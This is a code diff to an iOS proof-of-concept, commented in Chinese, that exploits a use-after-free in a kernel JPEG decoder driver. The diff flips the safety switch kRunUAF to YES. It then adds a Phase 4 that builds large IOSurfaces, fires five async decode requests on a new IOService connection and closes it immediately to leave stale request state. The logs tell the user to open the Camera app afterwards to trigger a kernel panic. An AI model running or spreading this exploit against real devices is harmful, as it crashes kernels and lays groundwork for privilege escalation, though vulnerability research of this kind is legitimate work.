@@ -52,8 +52,10 @@ static NSMutableString *gLog = nil;
 static UITextView    *gView = nil;
 static dispatch_queue_t gQ = nil;
 
-// ★ 安全开关：改成 YES 才会执行 Stage 4（可能 panic）
-static const BOOL kRunUAF = NO;
+// ★ 安全开关：改成 YES 才会执行 Stage 4（制造 stale 状态；不主动 panic）
+//   注意：Stage 4 只负责「发 async + 立刻关连接」，不打开相机。
+//   真正的 panic 需要你事后手动打开相机 App 才会触发。
+static const BOOL kRunUAF = YES;
 
 static const char *kr_name(kern_return_t kr)
 {
@@ -281,23 +283,54 @@ static void run(void)
         L(@"  后续 finish_io_gated 会遍历到已释放的 JpegRequest → 可能直接 panic。");
         L(@"  要跑就把源码里 kRunUAF 改成 YES 重新构建。");
     } else {
-        L(@"=== Phase 4: UAF 触发（kRunUAF = YES）===");
-        // 重新开一个连接，发 N 个 async，立刻关
-        io_connect_t c2 = MACH_PORT_NULL;
-        kern_return_t k2 = IOServiceOpen(svc, mach_task_self(), 0, &c2);
-        L(@"  新连接 0x%08x %s conn=0x%08x", (uint32_t)k2, kr_name(k2), c2);
-        if (k2 == KERN_SUCCESS) {
-            const int N = 5;
-            int submitted = 0;
-            for (int j = 0; j < N; j++) {
-                kern_return_t r = call_decode(c2, 1, srcID, dstID, W, H,
-                                              0x4141 + j, 3, "UAF submit");
-                if (r != KERN_SUCCESS) { L(@"  第 %d 个失败，停止", j); break; }
-                submitted++;
+        L(@"=== Phase 4: 制造 stale 状态（不主动 panic）===");
+        L(@"  配方：新连接 → 连发 async decode(token≠0) → 立刻 IOServiceClose");
+        L(@"  本阶段不打开相机，所以不会主动崩溃。");
+        L(@"  若一切正常，事后你手动打开相机，才会驱动同步解码并触发 panic。");
+
+        // 用更大的 surface 给硬件足够工作量（PoC 用 2048x2048）
+        const uint32_t BW = 2048, BH = 2048;
+        NSData *bigJpeg = makeJPEG(BW, BH);
+        IOSurfaceRef bsrc = makeSourceSurface(bigJpeg);
+        IOSurfaceRef bdst = makeDestSurface(BW, BH);
+        L(@"  大图 surface: src=%p dst=%p  jpeg=%lu bytes",
+          bsrc, bdst, (unsigned long)bigJpeg.length);
+
+        if (bsrc && bdst) {
+            uint32_t bsrcID = IOSurfaceGetID(bsrc);
+            uint32_t bdstID = IOSurfaceGetID(bdst);
+            L(@"  bsrcID=%u bdstID=%u", bsrcID, bdstID);
+
+            io_connect_t c2 = MACH_PORT_NULL;
+            kern_return_t k2 = IOServiceOpen(svc, mach_task_self(), 0, &c2);
+            L(@"  新连接 0x%08x %s conn=0x%08x", (uint32_t)k2, kr_name(k2), c2);
+            if (k2 == KERN_SUCCESS) {
+                const int N = 5;
+                int submitted = 0;
+                for (int j = 0; j < N; j++) {
+                    kern_return_t r = call_decode(c2, 1, bsrcID, bdstID, BW, BH,
+                                                  0x4141 + j, 3, "UAF submit");
+                    if (r != KERN_SUCCESS) { L(@"  第 %d 个失败，停止（驱动可能已满）", j); break; }
+                    submitted++;
+                }
+                L(@"  已提交 %d/%d 个 async 请求", submitted, N);
+
+                // ★ 关键：立刻关闭，不等硬件完成
+                IOServiceClose(c2);
+                L(@"  ★ 连接已关闭（此时硬件可能仍在处理，stale 状态已建立）");
+                L(@"");
+                L(@"  >>> 现在请手动打开「相机」App <<<");
+                L(@"     那会驱动一次同步 JPEG 解码 → 10 秒超时 →");
+                L(@"     finish_io_gated 遍历到已释放的 JpegRequest → 可能 panic");
+                L(@"");
+                L(@"     如果没崩，说明：要么洞不在这个版本，要么 reclaim 抢先了。");
+                L(@"     崩了的话，重启后我可以用 crash 日志取 panic 证据。");
             }
-            L(@"  已提交 %d 个 async 请求，现在关闭连接", submitted);
-            IOServiceClose(c2);
-            L(@"  连接已关闭 —— 之后打开相机可触发延迟 panic");
+            CFRelease(bsrc); CFRelease(bdst);
+        } else {
+            L(@"  大图 surface 创建失败，跳过 Phase 4");
+            if (bsrc) CFRelease(bsrc);
+            if (bdst) CFRelease(bdst);
         }
     }
 
